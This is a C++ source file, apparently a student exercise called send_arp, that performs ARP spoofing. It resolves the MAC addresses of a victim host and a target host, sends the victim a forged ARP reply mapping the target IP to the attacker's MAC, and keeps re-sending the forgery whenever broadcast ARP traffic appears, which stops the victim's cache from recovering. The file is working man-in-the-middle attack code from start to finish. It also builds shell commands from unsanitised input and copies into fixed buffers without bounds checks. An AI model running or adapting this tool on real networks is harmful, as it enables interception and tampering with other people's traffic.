#include <iostream>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <string.h>
#include <fstream>
#include <iomanip>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <thread>

using namespace std;

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

struct ARPPacket{
    struct ether_header eh;
    struct ether_arp arp;
};

void checkArgc(int argc);
void macAddrToHex(char* argvMac, u_int8_t *retnMac);
void findMyMac(char* device, u_int8_t *myMAC);
void printByHexData(u_int8_t* printArr,int length);
void printByMAC(u_int8_t *printArr, int length);
void printLine();
void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC, int print);
void sendARPReply(char* device, u_int8_t *sender_Mac, ARPPacket *arpReply, int packeLen);
void getMyIP(char* device, u_int8_t* myIP);
int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
int antiRecover(char *device);

/*send_arp <dev> <sender ip> <target ip>*/

int main(int argc, char *argv[])
{
    checkArgc(argc); //check argc & if wrong sentence print usage

    char* device = argv[1];
    char* senderIp=argv[2];
    char* targetIp=argv[3];

    u_int8_t my_Mac[ETHER_ADDR_LEN]; //hexed MAC Address
    findMyMac(device,my_Mac);


    u_int8_t myIP[16];
    getMyIP(device,myIP);

    char senderRules[50]="dst net ";
    strcat(senderRules,(char*)myIP);//dst net myIP
    strcat(senderRules," and "); //dst net myIP and
    strcat(senderRules,"src net ");//dst net myIP and src net

    char targetRules[50];
    memcpy(targetRules,senderRules,sizeof(senderRules)); //copy
    strcat(senderRules,senderIp);



    //find sender MAC
    u_int8_t sender_Mac[ETHER_ADDR_LEN];
    thread t1(&findARPReply,device,senderRules,sender_Mac);
    sleep(1);
    thread t2(&sendARPReguest,device,senderIp,my_Mac,0);
    t1.join();
    t2.join();

    //find target MAC
    u_int8_t target_Mac[ETHER_ADDR_LEN];
    strcat(targetRules,targetIp);
    thread t3(&findARPReply,device,targetRules,target_Mac);
    sleep(3);
    thread t4(&sendARPReguest,device,targetIp,my_Mac,0);
    t3.join();
    t4.join();



    cout<<"Sender MAC : ";
    printByMAC(sender_Mac,ETHER_ADDR_LEN);

    cout<<"Target MAC : ";
    printByMAC(target_Mac,ETHER_ADDR_LEN);

    ether_header ep;

    memcpy(ep.ether_dhost,sender_Mac,ETHER_ADDR_LEN); //destnation mac is sender mac
    memcpy(ep.ether_shost,my_Mac,ETHER_ADDR_LEN); //source mac is my mac

    ep.ether_type=htons(ETHERTYPE_ARP); //define next protocol


    struct ether_arp arp;

    arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
    arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
    arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)


    memcpy(arp.arp_sha,my_Mac,ETHER_ADDR_LEN);  //set Source Address to Sender MAC
    inet_pton(AF_INET,targetIp,arp.arp_spa);     //set Source Protocol Address to Target IP
    memcpy(arp.arp_tha,sender_Mac,ETHER_ADDR_LEN); //set Target Hardware Address to Sender MAC
    inet_pton(AF_INET,senderIp,arp.arp_tpa);    //set Target Protocol Address to Sender IP


    struct ARPPacket ARPReply;

    memcpy(&ARPReply.eh,&ep,sizeof(struct ether_header));
    memcpy(&ARPReply.arp,&arp,sizeof(struct ether_arp));

    sendARPReply(device,sender_Mac,&ARPReply,sizeof(struct ARPPacket)); //send reply packet
    int recoverCount=0;
    while(true)
    {
        if(antiRecover(device))
        {

            cout<<"antiRecover "<<++recoverCount<<"times worked!!"<<endl;
            sendARPReply(device,sender_Mac,&ARPReply,sizeof(struct ARPPacket)); //send reply packet

        }
    }

    return 0;
}

void checkArgc(int argc)
{
    if(argc!=4)
    {
        cout<<" *Usage :  send_arp <dev> <sender ip> <target ip>"<<endl;
        exit(0);
    }
}


void macAddrToHex(char *argvMac,u_int8_t *retnMac)
{
    int cnt=0;
    char tempArr[3];
    u_int8_t value;


    int i=0;

    while(true)
    {
        if(argvMac[i]==':') //if char is ':'
        {
            strncpy(tempArr,argvMac,2);
            tempArr[2]=0;
            value=strtol(tempArr,NULL,16);
            retnMac[cnt++]=(int)value;

            if(cnt==6)
                break;


            argvMac=&argvMac[i+1]; //str cut & save
            i=0;// init index

        }else{
            i++;
        }
    }

}

void findMyMac(char* device,u_int8_t* myMAC)
{
    system("ifconfig > tmp.txt");
    string command="sed -n '/";
    command.append(device);
    command.append("/,/colisions/p' tmp.txt | grep ether > myMac.txt");

    system(command.c_str()); //find device config & find "ether" & save to myMac.txt
    system("rm tmp.txt"); //delete tmp File

    //find MAC address

    string MACadress;

    ifstream readFile("myMac.txt");

    getline(readFile,MACadress);

    if(MACadress.size()==0)
    {
        cout<<"MAC address can't find!!!!"<<endl;
        exit(1);
    }


    MACadress= MACadress.substr(MACadress.find('r')+2); //ether AB:CD:EF:AB:CD:EF MACadress.find('ether') is return 'r' location
                                                            //therefore +2(MAC adddress start location

    MACadress= MACadress.substr(0,MACadress.find(' '));

    int lengthOfMAC=18; //AB:CD:EF:AB:CD:EF\0 => 18byte
    char temp[lengthOfMAC];
    strcpy(temp,MACadress.c_str());

    macAddrToHex(temp,myMAC); //if not use this here caused BOF

    cout<<"My(Attacker) MAC Address : ";
    printByMAC(myMAC,6);


}

void printByHexData(u_int8_t *printArr, int length)
{

    for(int i=0;i<length;i++)
    {
        if(i%16==0)
            cout<<endl;
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i]<<" ";


    }

    cout<<dec<<endl;
    printLine();
}

void printByMAC(u_int8_t *printArr,int length)
{
    for(int i=0;i<length;i++)
    {
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i];
        if(i!=5)
            cout<<":";

    }

    cout<<dec<<endl<<endl;
}

void printLine()
{
    cout<<"-----------------------------------------------"<<endl;
}

void sendARPReguest(char *device, char *senderIP,u_int8_t* my_MAC,int print)
{

    struct ether_header eARPRequest;
    u_int8_t broadcast[]={0xff,0xff,0xff,0xff,0xff,0xff};

    memcpy(eARPRequest.ether_dhost,broadcast,ETHER_ADDR_LEN); //set destination address to broadcast
    memcpy(eARPRequest.ether_shost,my_MAC,ETHER_ADDR_LEN); //set source address to myMAC
    eARPRequest.ether_type=htons(ETH_P_ARP);


    struct ether_arp arp;

    arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    arp.ea_hdr.ar_hln=6;                    //set Hardware Size 6 -> MAC address size
    arp.ea_hdr.ar_pln=4;                    //set Protocol length 4 -> 4 IP address size
    arp.ea_hdr.ar_op=ntohs(1);              //set opcode 1(request)

    u_int8_t ARPTargetMAC[ETHER_ADDR_LEN]={0x00,0x00,0x00,0x00,0x00,0x00};

    u_int8_t myIP[16];

    getMyIP(device,myIP);

    memcpy(arp.arp_sha,my_MAC,sizeof(arp.arp_sha));  //set Source Address to Sender MAC
    inet_pton(AF_INET,(char*)myIP,arp.arp_spa);     //set Source Protocol Address to My IP
    memcpy(arp.arp_tha,ARPTargetMAC,sizeof(arp.arp_tha)); //set Target Hardware Address to Sender MAC
    inet_pton(AF_INET,senderIP,arp.arp_tpa);    //set Target Protocol Address to Sender IP



    struct ARPPacket ARPRequest;

    memcpy(&ARPRequest.eh,&eARPRequest,sizeof(struct ether_header));
    memcpy(&ARPRequest.arp,&arp,sizeof(struct ether_arp));



    int sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));

    u_int8_t *ARP = (u_int8_t*)&ARPRequest;

    if(print)
    {
         cout<<"Send ARP Request Packet !!"<<endl;
         cout<<"socket discryptor number : "<<sock<<endl<<endl;
         cout<<"Send Arp Packet Data "<<endl;
         printByHexData(ARP,sizeof(struct ARPPacket));
    }


    struct sockaddr_ll dest;

     memset(&dest,0,sizeof(dest)); //init
     dest.sll_family=htons(PF_PACKET);
     dest.sll_protocol=htons(ETH_P_ARP);
     dest.sll_halen=6; //Address Length
     dest.sll_ifindex=if_nametoindex(device);

     memcpy(dest.sll_addr,ARPTargetMAC,ETHER_ADDR_LEN); //desination MAC

    if(sendto(sock,ARP,sizeof(struct ARPPacket),0,(struct sockaddr*)&dest,sizeof(dest))==-1)
         cout<<strerror(errno)<<endl;

    close(sock);
}

void sendARPReply(char* device,u_int8_t* sender_Mac,ARPPacket *ARPReply,int packetLen)
{

    u_int8_t *arpReply=(u_int8_t*)ARPReply;
    cout<<endl;
    cout<<"Send ARP Reply Packet !!!"<<endl;

    int sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
    cout<<"socket discryptor number : "<<sock<<endl<<endl;

    cout<<"Send Arp Packet Data "<<endl;
    printByHexData(arpReply,packetLen);


    struct sockaddr_ll dest;

     memset(&dest,0,sizeof(dest)); //init
     dest.sll_family=htons(PF_PACKET);
     dest.sll_protocol=htons(ETH_P_ARP);
     dest.sll_halen=6; //Address Length
     dest.sll_ifindex=if_nametoindex(device);

     memcpy(dest.sll_addr,sender_Mac,ETHER_ADDR_LEN);

     cout<<endl;

     cout<<"Device Index : "<<(int)dest.sll_ifindex<<endl<<endl;
     u_int8_t *ptest=(u_int8_t*)&dest;
     cout<<"Sockaddr_ll data"<<endl;
     printByHexData(ptest,sizeof(dest));



    if(sendto(sock,arpReply,packetLen,0,(struct sockaddr*)&dest,sizeof(dest))==-1)
         cout<<strerror(errno)<<endl;

    close(sock);
}

void getMyIP(char* device, u_int8_t* myIP)//return dotted decimal
{
    int fd;
    struct ifreq ifr;

    fd=socket(AF_INET,SOCK_DGRAM,0);


    ifr.ifr_ifru.ifru_addr.sa_family=AF_INET; //input type
    strcpy(ifr.ifr_ifrn.ifrn_name,device); // input device name

    ioctl(fd,SIOCGIFADDR,&ifr); //SIOCGIFADDR -> Get Protocol Address
    close(fd);

    u_int8_t ipstr[16];//xxx.xxx.xxx.xxx

    inet_ntop(AF_INET,ifr.ifr_ifru.ifru_addr.sa_data+2,(char*)ipstr,sizeof(struct sockaddr));


    memcpy(myIP,ipstr,sizeof(struct ifreq));
}

int findARPReply(char *device, char *rule,u_int8_t *retnMAC)
{

    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    char errBuf[PCAP_ERRBUF_SIZE];

    int ret = pcap_lookupnet(device,&netp,&maskp,errBuf);
    if(ret<0)
    {
        perror(errBuf);
    }
    pcap_t *pcd;


    if((pcd=pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errBuf))==NULL)
    {
        perror(errBuf);
        exit(1);
    }

    struct bpf_program fp;

    if(pcap_compile(pcd,&fp,rule,0,netp)==-1)
    {
        cout<<"Set comfile error!!!"<<endl;
        exit(1);
    }

    if(pcap_setfilter(pcd,&fp)==-1)
    {
        cout<<"Setfilter error"<<endl;
        exit(1);
    }


    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:
                   struct ether_header *ep;
                   ep=(struct ether_header*)pkt_data;
                   memcpy(retnMAC,ep->ether_shost,sizeof(ep->ether_shost));
                   return 0;
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }
}

int antiRecover(char* device)
{

    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    char errBuf[PCAP_ERRBUF_SIZE];

    int ret = pcap_lookupnet(device,&netp,&maskp,errBuf);
    if(ret<0)
    {
        perror(errBuf);
    }
    pcap_t *pcd;


    if((pcd=pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errBuf))==NULL)
    {
        perror(errBuf);
        exit(1);
    }

    struct bpf_program fp;

    char rules[50]="ether broadcast and ether proto \\arp";

    if(pcap_compile(pcd,&fp,rules,0,netp)==-1)
    {
        cout<<"Set comfile error!!!"<<endl;
        exit(1);
    }

    if(pcap_setfilter(pcd,&fp)==-1)
    {
        cout<<"Setfilter error"<<endl;
        exit(1);
    }


    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:
                return 1;
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }

}
